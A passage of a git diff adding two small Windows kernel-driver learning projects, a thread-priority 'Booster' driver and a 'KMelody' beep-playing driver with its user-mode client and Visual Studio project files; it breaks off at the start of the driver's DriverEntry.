++	Irp->IoStatus.Status = status;
++	Irp->IoStatus.Information = 0;	
++	IoCompleteRequest(Irp, IO_NO_INCREMENT);
++	return status;
++
++}
+\ No newline at end of file
+diff --git a/Booster/Booster/Booster.vcxproj b/Booster/Booster/Booster.vcxproj
+new file mode 100644
+index 0000000..576931c
+--- /dev/null
++++ b/Booster/Booster/Booster.vcxproj
+@@ -0,0 +1,101 @@
++﻿<?xml version="1.0" encoding="utf-8"?>
++<Project DefaultTargets="Build" ToolsVersion="12.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
++  <ItemGroup Label="ProjectConfigurations">
++    <ProjectConfiguration Include="Debug|x64">
++      <Configuration>Debug</Configuration>
++      <Platform>x64</Platform>
++    </ProjectConfiguration>
++    <ProjectConfiguration Include="Release|x64">
++      <Configuration>Release</Configuration>
++      <Platform>x64</Platform>
++    </ProjectConfiguration>
++    <ProjectConfiguration Include="Debug|ARM64">
++      <Configuration>Debug</Configuration>
++      <Platform>ARM64</Platform>
++    </ProjectConfiguration>
++    <ProjectConfiguration Include="Release|ARM64">
++      <Configuration>Release</Configuration>
++      <Platform>ARM64</Platform>
++    </ProjectConfiguration>
++  </ItemGroup>
++  <PropertyGroup Label="Globals">
++    <ProjectGuid>{EB7F3114-BE8F-4AA6-979C-E31BCCC9C969}</ProjectGuid>
++    <TemplateGuid>{dd38f7fc-d7bd-488b-9242-7d8754cde80d}</TemplateGuid>
++    <TargetFrameworkVersion>v4.5</TargetFrameworkVersion>
++    <MinimumVisualStudioVersion>12.0</MinimumVisualStudioVersion>
++    <Configuration>Debug</Configuration>
++    <Platform Condition="'$(Platform)' == ''">x64</Platform>
++    <RootNamespace>Booster</RootNamespace>
++  </PropertyGroup>
++  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
++  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'" Label="Configuration">
++    <TargetVersion>Windows10</TargetVersion>
++    <UseDebugLibraries>true</UseDebugLibraries>
++    <PlatformToolset>WindowsKernelModeDriver10.0</PlatformToolset>
++    <ConfigurationType>Driver</ConfigurationType>
++    <DriverType>WDM</DriverType>
++  </PropertyGroup>
++  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'" Label="Configuration">
++    <TargetVersion>Windows10</TargetVersion>
++    <UseDebugLibraries>false</UseDebugLibraries>
++    <PlatformToolset>WindowsKernelModeDriver10.0</PlatformToolset>
++    <ConfigurationType>Driver</ConfigurationType>
++    <DriverType>WDM</DriverType>
++  </PropertyGroup>
++  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|ARM64'" Label="Configuration">
++    <TargetVersion>Windows10</TargetVersion>
++    <UseDebugLibraries>true</UseDebugLibraries>
++    <PlatformToolset>WindowsKernelModeDriver10.0</PlatformToolset>
++    <ConfigurationType>Driver</ConfigurationType>
++    <DriverType>WDM</DriverType>
++  </PropertyGroup>
++  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|ARM64'" Label="Configuration">
++    <TargetVersion>Windows10</TargetVersion>
++    <UseDebugLibraries>false</UseDebugLibraries>
++    <PlatformToolset>WindowsKernelModeDriver10.0</PlatformToolset>
++    <ConfigurationType>Driver</ConfigurationType>
++    <DriverType>WDM</DriverType>
++  </PropertyGroup>
++  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
++  <ImportGroup Label="ExtensionSettings">
++  </ImportGroup>
++  <ImportGroup Label="PropertySheets">
++    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
++  </ImportGroup>
++  <PropertyGroup Label="UserMacros" />
++  <PropertyGroup />
++  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
++    <DebuggerFlavor>DbgengKernelDebugger</DebuggerFlavor>
++  </PropertyGroup>
++  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
++    <DebuggerFlavor>DbgengKernelDebugger</DebuggerFlavor>
++  </PropertyGroup>
++  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|ARM64'">
++    <DebuggerFlavor>DbgengKernelDebugger</DebuggerFlavor>
++  </PropertyGroup>
++  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|ARM64'">
++    <DebuggerFlavor>DbgengKernelDebugger</DebuggerFlavor>
++  </PropertyGroup>
++  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
++    <DriverSign>
++      <FileDigestAlgorithm>sha256</FileDigestAlgorithm>
++    </DriverSign>
++  </ItemDefinitionGroup>
++  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
++    <DriverSign>
++      <FileDigestAlgorithm>sha256</FileDigestAlgorithm>
++    </DriverSign>
++  </ItemDefinitionGroup>
++  <ItemGroup>
++    <FilesToPackage Include="$(TargetPath)" />
++  </ItemGroup>
++  <ItemGroup>
++    <ClCompile Include="Booster.cpp" />
++  </ItemGroup>
++  <ItemGroup>
++    <ClInclude Include="BoosterCommon.h" />
++  </ItemGroup>
++  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
++  <ImportGroup Label="ExtensionTargets">
++  </ImportGroup>
++</Project>
+\ No newline at end of file
+diff --git a/Booster/Booster/Booster.vcxproj.filters b/Booster/Booster/Booster.vcxproj.filters
+new file mode 100644
+index 0000000..17bc63e
+--- /dev/null
++++ b/Booster/Booster/Booster.vcxproj.filters
+@@ -0,0 +1,31 @@
++﻿<?xml version="1.0" encoding="utf-8"?>
++<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
++  <ItemGroup>
++    <Filter Include="Source Files">
++      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
++      <Extensions>cpp;c;cc;cxx;def;odl;idl;hpj;bat;asm;asmx</Extensions>
++    </Filter>
++    <Filter Include="Header Files">
++      <UniqueIdentifier>{93995380-89BD-4b04-88EB-625FBE52EBFB}</UniqueIdentifier>
++      <Extensions>h;hpp;hxx;hm;inl;inc;xsd</Extensions>
++    </Filter>
++    <Filter Include="Resource Files">
++      <UniqueIdentifier>{67DA6AB6-F800-4c08-8B7A-83BB121AAD01}</UniqueIdentifier>
++      <Extensions>rc;ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe;resx;tiff;tif;png;wav;mfcribbon-ms</Extensions>
++    </Filter>
++    <Filter Include="Driver Files">
++      <UniqueIdentifier>{8E41214B-6785-4CFE-B992-037D68949A14}</UniqueIdentifier>
++      <Extensions>inf;inv;inx;mof;mc;</Extensions>
++    </Filter>
++  </ItemGroup>
++  <ItemGroup>
++    <ClCompile Include="Booster.cpp">
++      <Filter>Source Files</Filter>
++    </ClCompile>
++  </ItemGroup>
++  <ItemGroup>
++    <ClInclude Include="BoosterCommon.h">
++      <Filter>Header Files</Filter>
++    </ClInclude>
++  </ItemGroup>
++</Project>
+\ No newline at end of file
+diff --git a/Booster/Booster/BoosterCommon.h b/Booster/Booster/BoosterCommon.h
+new file mode 100644
+index 0000000..340b27c
+--- /dev/null
++++ b/Booster/Booster/BoosterCommon.h
+@@ -0,0 +1,8 @@
++#pragma once
++
++#define IOCTL_SET_PRIORITY CTL_CODE(0x8000, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)
++
++struct ThreadData {
++	ULONG ThreadId; 
++	int priority; 
++};
+\ No newline at end of file
+diff --git a/KMelody/ClientMelody/ClientMelody.c b/KMelody/ClientMelody/ClientMelody.c
+new file mode 100644
+index 0000000..af91132
+--- /dev/null
++++ b/KMelody/ClientMelody/ClientMelody.c
+@@ -0,0 +1,27 @@
++#include <Windows.h>
++#include <stdio.h>
++#include "..\KMelody\MelodyPublic.h"
++int main() {
++	HANDLE hDevice = CreateFile(MELODY_SYMLINK, GENERIC_WRITE, 0,
++		NULL, OPEN_EXISTING, 0, NULL);
++	Note notes[10];
++	for (int i = 0; i < _countof(notes); i++) {
++		notes[i].Frequency = 400 + i * 30;
++		notes[i].Duration = 500;
++		notes[i].Repeat = 1;
++		notes[i].Delay = 0;
++	}
++	DWORD bytes;
++	DeviceIoControl(hDevice, IOCTL_MELODY_PLAY, notes, sizeof(notes),
++		NULL, 0, &bytes, NULL);
++	for (int i = 0; i < _countof(notes); i++) {
++		notes[i].Frequency = 1200 - i * 100;
++		notes[i].Duration = 300;
++		notes[i].Repeat = 2;
++		notes[i].Delay = 300;
++	}
++	DeviceIoControl(hDevice, IOCTL_MELODY_PLAY, notes, sizeof(notes),
++		NULL, 0, &bytes, NULL);
++	CloseHandle(hDevice);
++	return 0;
++}
+\ No newline at end of file
+diff --git a/KMelody/ClientMelody/ClientMelody.vcxproj b/KMelody/ClientMelody/ClientMelody.vcxproj
+new file mode 100644
+index 0000000..6064123
+--- /dev/null
++++ b/KMelody/ClientMelody/ClientMelody.vcxproj
+@@ -0,0 +1,136 @@
++<?xml version="1.0" encoding="utf-8"?>
++<Project DefaultTargets="Build" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
++  <ItemGroup Label="ProjectConfigurations">
++    <ProjectConfiguration Include="Debug|Win32">
++      <Configuration>Debug</Configuration>
++      <Platform>Win32</Platform>
++    </ProjectConfiguration>
++    <ProjectConfiguration Include="Release|Win32">
++      <Configuration>Release</Configuration>
++      <Platform>Win32</Platform>
++    </ProjectConfiguration>
++    <ProjectConfiguration Include="Debug|x64">
++      <Configuration>Debug</Configuration>
++      <Platform>x64</Platform>
++    </ProjectConfiguration>
++    <ProjectConfiguration Include="Release|x64">
++      <Configuration>Release</Configuration>
++      <Platform>x64</Platform>
++    </ProjectConfiguration>
++  </ItemGroup>
++  <PropertyGroup Label="Globals">
++    <VCProjectVersion>17.0</VCProjectVersion>
++    <Keyword>Win32Proj</Keyword>
++    <ProjectGuid>{71ca6ff2-13ea-43b5-899f-ee154e4816ea}</ProjectGuid>
++    <RootNamespace>ClientMelody</RootNamespace>
++    <WindowsTargetPlatformVersion>10.0</WindowsTargetPlatformVersion>
++  </PropertyGroup>
++  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
++  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'" Label="Configuration">
++    <ConfigurationType>Application</ConfigurationType>
++    <UseDebugLibraries>true</UseDebugLibraries>
++    <PlatformToolset>v143</PlatformToolset>
++    <CharacterSet>Unicode</CharacterSet>
++  </PropertyGroup>
++  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'" Label="Configuration">
++    <ConfigurationType>Application</ConfigurationType>
++    <UseDebugLibraries>false</UseDebugLibraries>
++    <PlatformToolset>v143</PlatformToolset>
++    <WholeProgramOptimization>true</WholeProgramOptimization>
++    <CharacterSet>Unicode</CharacterSet>
++  </PropertyGroup>
++  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'" Label="Configuration">
++    <ConfigurationType>Application</ConfigurationType>
++    <UseDebugLibraries>true</UseDebugLibraries>
++    <PlatformToolset>v143</PlatformToolset>
++    <CharacterSet>Unicode</CharacterSet>
++  </PropertyGroup>
++  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'" Label="Configuration">
++    <ConfigurationType>Application</ConfigurationType>
++    <UseDebugLibraries>false</UseDebugLibraries>
++    <PlatformToolset>v143</PlatformToolset>
++    <WholeProgramOptimization>true</WholeProgramOptimization>
++    <CharacterSet>Unicode</CharacterSet>
++  </PropertyGroup>
++  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
++  <ImportGroup Label="ExtensionSettings">
++  </ImportGroup>
++  <ImportGroup Label="Shared">
++  </ImportGroup>
++  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
++    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
++  </ImportGroup>
++  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
++    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
++  </ImportGroup>
++  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
++    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
++  </ImportGroup>
++  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
++    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
++  </ImportGroup>
++  <PropertyGroup Label="UserMacros" />
++  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
++    <ClCompile>
++      <WarningLevel>Level3</WarningLevel>
++      <SDLCheck>true</SDLCheck>
++      <PreprocessorDefinitions>WIN32;_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
++      <ConformanceMode>true</ConformanceMode>
++    </ClCompile>
++    <Link>
++      <SubSystem>Console</SubSystem>
++      <GenerateDebugInformation>true</GenerateDebugInformation>
++    </Link>
++  </ItemDefinitionGroup>
++  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
++    <ClCompile>
++      <WarningLevel>Level3</WarningLevel>
++      <FunctionLevelLinking>true</FunctionLevelLinking>
++      <IntrinsicFunctions>true</IntrinsicFunctions>
++      <SDLCheck>true</SDLCheck>
++      <PreprocessorDefinitions>WIN32;NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
++      <ConformanceMode>true</ConformanceMode>
++    </ClCompile>
++    <Link>
++      <SubSystem>Console</SubSystem>
++      <EnableCOMDATFolding>true</EnableCOMDATFolding>
++      <OptimizeReferences>true</OptimizeReferences>
++      <GenerateDebugInformation>true</GenerateDebugInformation>
++    </Link>
++  </ItemDefinitionGroup>
++  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
++    <ClCompile>
++      <WarningLevel>Level3</WarningLevel>
++      <SDLCheck>true</SDLCheck>
++      <PreprocessorDefinitions>_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
++      <ConformanceMode>true</ConformanceMode>
++      <RuntimeLibrary>MultiThreadedDebug</RuntimeLibrary>
++    </ClCompile>
++    <Link>
++      <SubSystem>Console</SubSystem>
++      <GenerateDebugInformation>true</GenerateDebugInformation>
++    </Link>
++  </ItemDefinitionGroup>
++  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
++    <ClCompile>
++      <WarningLevel>Level3</WarningLevel>
++      <FunctionLevelLinking>true</FunctionLevelLinking>
++      <IntrinsicFunctions>true</IntrinsicFunctions>
++      <SDLCheck>true</SDLCheck>
++      <PreprocessorDefinitions>NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
++      <ConformanceMode>true</ConformanceMode>
++    </ClCompile>
++    <Link>
++      <SubSystem>Console</SubSystem>
++      <EnableCOMDATFolding>true</EnableCOMDATFolding>
++      <OptimizeReferences>true</OptimizeReferences>
++      <GenerateDebugInformation>true</GenerateDebugInformation>
++    </Link>
++  </ItemDefinitionGroup>
++  <ItemGroup>
++    <ClCompile Include="ClientMelody.c" />
++  </ItemGroup>
++  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
++  <ImportGroup Label="ExtensionTargets">
++  </ImportGroup>
++</Project>
+\ No newline at end of file
+diff --git a/KMelody/ClientMelody/ClientMelody.vcxproj.filters b/KMelody/ClientMelody/ClientMelody.vcxproj.filters
+new file mode 100644
+index 0000000..19b574d
+--- /dev/null
++++ b/KMelody/ClientMelody/ClientMelody.vcxproj.filters
+@@ -0,0 +1,22 @@
++﻿<?xml version="1.0" encoding="utf-8"?>
++<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
++  <ItemGroup>
++    <Filter Include="Source Files">
++      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
++      <Extensions>cpp;c;cc;cxx;c++;cppm;ixx;def;odl;idl;hpj;bat;asm;asmx</Extensions>
++    </Filter>
++    <Filter Include="Header Files">
++      <UniqueIdentifier>{93995380-89BD-4b04-88EB-625FBE52EBFB}</UniqueIdentifier>
++      <Extensions>h;hh;hpp;hxx;h++;hm;inl;inc;ipp;xsd</Extensions>
++    </Filter>
++    <Filter Include="Resource Files">
++      <UniqueIdentifier>{67DA6AB6-F800-4c08-8B7A-83BB121AAD01}</UniqueIdentifier>
++      <Extensions>rc;ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe;resx;tiff;tif;png;wav;mfcribbon-ms</Extensions>
++    </Filter>
++  </ItemGroup>
++  <ItemGroup>
++    <ClCompile Include="ClientMelody.c">
++      <Filter>Source Files</Filter>
++    </ClCompile>
++  </ItemGroup>
++</Project>
+\ No newline at end of file
+diff --git a/KMelody/KMelody.sln b/KMelody/KMelody.sln
+new file mode 100644
+index 0000000..b27d2b2
+--- /dev/null
++++ b/KMelody/KMelody.sln
+@@ -0,0 +1,42 @@
++﻿
++Microsoft Visual Studio Solution File, Format Version 12.00
++# Visual Studio Version 17
++VisualStudioVersion = 17.12.35707.178
++MinimumVisualStudioVersion = 10.0.40219.1
++Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "KMelody", "KMelody\KMelody.vcxproj", "{1F932CD8-4DC1-4ED7-949F-BFE337F93066}"
++EndProject
++Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "ClientMelody", "ClientMelody\ClientMelody.vcxproj", "{71CA6FF2-13EA-43B5-899F-EE154E4816EA}"
++EndProject
++Global
++	GlobalSection(SolutionConfigurationPlatforms) = preSolution
++		Debug|ARM64 = Debug|ARM64
++		Debug|x64 = Debug|x64
++		Release|ARM64 = Release|ARM64
++		Release|x64 = Release|x64
++	EndGlobalSection
++	GlobalSection(ProjectConfigurationPlatforms) = postSolution
++		{1F932CD8-4DC1-4ED7-949F-BFE337F93066}.Debug|ARM64.ActiveCfg = Debug|ARM64
++		{1F932CD8-4DC1-4ED7-949F-BFE337F93066}.Debug|ARM64.Build.0 = Debug|ARM64
++		{1F932CD8-4DC1-4ED7-949F-BFE337F93066}.Debug|ARM64.Deploy.0 = Debug|ARM64
++		{1F932CD8-4DC1-4ED7-949F-BFE337F93066}.Debug|x64.ActiveCfg = Debug|x64
++		{1F932CD8-4DC1-4ED7-949F-BFE337F93066}.Debug|x64.Build.0 = Debug|x64
++		{1F932CD8-4DC1-4ED7-949F-BFE337F93066}.Debug|x64.Deploy.0 = Debug|x64
++		{1F932CD8-4DC1-4ED7-949F-BFE337F93066}.Release|ARM64.ActiveCfg = Release|ARM64
++		{1F932CD8-4DC1-4ED7-949F-BFE337F93066}.Release|ARM64.Build.0 = Release|ARM64
++		{1F932CD8-4DC1-4ED7-949F-BFE337F93066}.Release|ARM64.Deploy.0 = Release|ARM64
++		{1F932CD8-4DC1-4ED7-949F-BFE337F93066}.Release|x64.ActiveCfg = Release|x64
++		{1F932CD8-4DC1-4ED7-949F-BFE337F93066}.Release|x64.Build.0 = Release|x64
++		{1F932CD8-4DC1-4ED7-949F-BFE337F93066}.Release|x64.Deploy.0 = Release|x64
++		{71CA6FF2-13EA-43B5-899F-EE154E4816EA}.Debug|ARM64.ActiveCfg = Debug|x64
++		{71CA6FF2-13EA-43B5-899F-EE154E4816EA}.Debug|ARM64.Build.0 = Debug|x64
++		{71CA6FF2-13EA-43B5-899F-EE154E4816EA}.Debug|x64.ActiveCfg = Debug|x64
++		{71CA6FF2-13EA-43B5-899F-EE154E4816EA}.Debug|x64.Build.0 = Debug|x64
++		{71CA6FF2-13EA-43B5-899F-EE154E4816EA}.Release|ARM64.ActiveCfg = Release|x64
++		{71CA6FF2-13EA-43B5-899F-EE154E4816EA}.Release|ARM64.Build.0 = Release|x64
++		{71CA6FF2-13EA-43B5-899F-EE154E4816EA}.Release|x64.ActiveCfg = Release|x64
++		{71CA6FF2-13EA-43B5-899F-EE154E4816EA}.Release|x64.Build.0 = Release|x64
++	EndGlobalSection
++	GlobalSection(SolutionProperties) = preSolution
++		HideSolutionNode = FALSE
++	EndGlobalSection
++EndGlobal
+diff --git a/KMelody/KMelody/KMelody.vcxproj b/KMelody/KMelody/KMelody.vcxproj
+new file mode 100644
+index 0000000..02d9a99
+--- /dev/null
++++ b/KMelody/KMelody/KMelody.vcxproj
+@@ -0,0 +1,112 @@
++﻿<?xml version="1.0" encoding="utf-8"?>
++<Project DefaultTargets="Build" ToolsVersion="12.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
++  <ItemGroup Label="ProjectConfigurations">
++    <ProjectConfiguration Include="Debug|x64">
++      <Configuration>Debug</Configuration>
++      <Platform>x64</Platform>
++    </ProjectConfiguration>
++    <ProjectConfiguration Include="Release|x64">
++      <Configuration>Release</Configuration>
++      <Platform>x64</Platform>
++    </ProjectConfiguration>
++    <ProjectConfiguration Include="Debug|ARM64">
++      <Configuration>Debug</Configuration>
++      <Platform>ARM64</Platform>
++    </ProjectConfiguration>
++    <ProjectConfiguration Include="Release|ARM64">
++      <Configuration>Release</Configuration>
++      <Platform>ARM64</Platform>
++    </ProjectConfiguration>
++  </ItemGroup>
++  <PropertyGroup Label="Globals">
++    <ProjectGuid>{1F932CD8-4DC1-4ED7-949F-BFE337F93066}</ProjectGuid>
++    <TemplateGuid>{dd38f7fc-d7bd-488b-9242-7d8754cde80d}</TemplateGuid>
++    <TargetFrameworkVersion>v4.5</TargetFrameworkVersion>
++    <MinimumVisualStudioVersion>12.0</MinimumVisualStudioVersion>
++    <Configuration>Debug</Configuration>
++    <Platform Condition="'$(Platform)' == ''">x64</Platform>
++    <RootNamespace>KMelody</RootNamespace>
++  </PropertyGroup>
++  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
++  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'" Label="Configuration">
++    <TargetVersion>Windows10</TargetVersion>
++    <UseDebugLibraries>true</UseDebugLibraries>
++    <PlatformToolset>WindowsKernelModeDriver10.0</PlatformToolset>
++    <ConfigurationType>Driver</ConfigurationType>
++    <DriverType>WDM</DriverType>
++    <Driver_SpectreMitigation>Spectre</Driver_SpectreMitigation>
++  </PropertyGroup>
++  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'" Label="Configuration">
++    <TargetVersion>Windows10</TargetVersion>
++    <UseDebugLibraries>false</UseDebugLibraries>
++    <PlatformToolset>WindowsKernelModeDriver10.0</PlatformToolset>
++    <ConfigurationType>Driver</ConfigurationType>
++    <DriverType>WDM</DriverType>
++  </PropertyGroup>
++  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|ARM64'" Label="Configuration">
++    <TargetVersion>Windows10</TargetVersion>
++    <UseDebugLibraries>true</UseDebugLibraries>
++    <PlatformToolset>WindowsKernelModeDriver10.0</PlatformToolset>
++    <ConfigurationType>Driver</ConfigurationType>
++    <DriverType>WDM</DriverType>
++  </PropertyGroup>
++  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|ARM64'" Label="Configuration">
++    <TargetVersion>Windows10</TargetVersion>
++    <UseDebugLibraries>false</UseDebugLibraries>
++    <PlatformToolset>WindowsKernelModeDriver10.0</PlatformToolset>
++    <ConfigurationType>Driver</ConfigurationType>
++    <DriverType>WDM</DriverType>
++  </PropertyGroup>
++  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
++  <ImportGroup Label="ExtensionSettings">
++  </ImportGroup>
++  <ImportGroup Label="PropertySheets">
++    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
++  </ImportGroup>
++  <PropertyGroup Label="UserMacros" />
++  <PropertyGroup />
++  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
++    <DebuggerFlavor>DbgengKernelDebugger</DebuggerFlavor>
++  </PropertyGroup>
++  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
++    <DebuggerFlavor>DbgengKernelDebugger</DebuggerFlavor>
++  </PropertyGroup>
++  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|ARM64'">
++    <DebuggerFlavor>DbgengKernelDebugger</DebuggerFlavor>
++  </PropertyGroup>
++  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|ARM64'">
++    <DebuggerFlavor>DbgengKernelDebugger</DebuggerFlavor>
++  </PropertyGroup>
++  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
++    <DriverSign>
++      <FileDigestAlgorithm>sha256</FileDigestAlgorithm>
++    </DriverSign>
++    <ClCompile>
++      <RuntimeLibrary>MultiThreadedDebug</RuntimeLibrary>
++      <ControlFlowGuard>Guard</ControlFlowGuard>
++      <TreatWarningAsError>true</TreatWarningAsError>
++    </ClCompile>
++    <Link>
++      <EntryPointSymbol>GsDriverEntry</EntryPointSymbol>
++    </Link>
++  </ItemDefinitionGroup>
++  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
++    <DriverSign>
++      <FileDigestAlgorithm>sha256</FileDigestAlgorithm>
++    </DriverSign>
++  </ItemDefinitionGroup>
++  <ItemGroup>
++    <FilesToPackage Include="$(TargetPath)" />
++  </ItemGroup>
++  <ItemGroup>
++    <ClInclude Include="MelodyPublic.h" />
++    <ClInclude Include="PlaybackState.h" />
++  </ItemGroup>
++  <ItemGroup>
++    <ClCompile Include="Main.c" />
++    <ClCompile Include="PlaybackState.c" />
++  </ItemGroup>
++  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
++  <ImportGroup Label="ExtensionTargets">
++  </ImportGroup>
++</Project>
+\ No newline at end of file
+diff --git a/KMelody/KMelody/KMelody.vcxproj.filters b/KMelody/KMelody/KMelody.vcxproj.filters
+new file mode 100644
+index 0000000..0a0e0fe
+--- /dev/null
++++ b/KMelody/KMelody/KMelody.vcxproj.filters
+@@ -0,0 +1,37 @@
++﻿<?xml version="1.0" encoding="utf-8"?>
++<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
++  <ItemGroup>
++    <Filter Include="Source Files">
++      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
++      <Extensions>cpp;c;cc;cxx;def;odl;idl;hpj;bat;asm;asmx</Extensions>
++    </Filter>
++    <Filter Include="Header Files">
++      <UniqueIdentifier>{93995380-89BD-4b04-88EB-625FBE52EBFB}</UniqueIdentifier>
++      <Extensions>h;hpp;hxx;hm;inl;inc;xsd</Extensions>
++    </Filter>
++    <Filter Include="Resource Files">
++      <UniqueIdentifier>{67DA6AB6-F800-4c08-8B7A-83BB121AAD01}</UniqueIdentifier>
++      <Extensions>rc;ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe;resx;tiff;tif;png;wav;mfcribbon-ms</Extensions>
++    </Filter>
++    <Filter Include="Driver Files">
++      <UniqueIdentifier>{8E41214B-6785-4CFE-B992-037D68949A14}</UniqueIdentifier>
++      <Extensions>inf;inv;inx;mof;mc;</Extensions>
++    </Filter>
++  </ItemGroup>
++  <ItemGroup>
++    <ClInclude Include="MelodyPublic.h">
++      <Filter>Header Files</Filter>
++    </ClInclude>
++    <ClInclude Include="PlaybackState.h">
++      <Filter>Header Files</Filter>
++    </ClInclude>
++  </ItemGroup>
++  <ItemGroup>
++    <ClCompile Include="Main.c">
++      <Filter>Source Files</Filter>
++    </ClCompile>
++    <ClCompile Include="PlaybackState.c">
++      <Filter>Source Files</Filter>
++    </ClCompile>
++  </ItemGroup>
++</Project>
+\ No newline at end of file
+diff --git a/KMelody/KMelody/Locker.h b/KMelody/KMelody/Locker.h
+new file mode 100644
+index 0000000..eebbb5a
+--- /dev/null
++++ b/KMelody/KMelody/Locker.h
+@@ -0,0 +1,10 @@
++#pragma once
++
++typedef struct _Locker {
++    PFAST_MUTEX Lock;
++} Locker, *PLocker;
++
++// Function to initialize and acquire the lock
++void Locker_Init(Locker* locker, PFAST_MUTEX lock);
++// Function to release the lock
++void Locker_Release(Locker* locker);
+\ No newline at end of file
+diff --git a/KMelody/KMelody/Main.c b/KMelody/KMelody/Main.c
+new file mode 100644
+index 0000000..31b86e1
+--- /dev/null
++++ b/KMelody/KMelody/Main.c
+@@ -0,0 +1,101 @@
++#include <ntddk.h>
++#include "..\KMelody\MelodyPublic.h"
++#include "..\KMelody\PlaybackState.h"
++
++void MelodyUnload(PDRIVER_OBJECT DriverObject);
++NTSTATUS MelodyCreateClose(PDEVICE_OBJECT DeviceObject, PIRP Irp);
++NTSTATUS MelodyDeviceControl(PDEVICE_OBJECT DeviceObject, PIRP Irp);
++
++
++PPlaybackState g_State;
++
++NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) {
++	
++	UNREFERENCED_PARAMETER(RegistryPath);
++
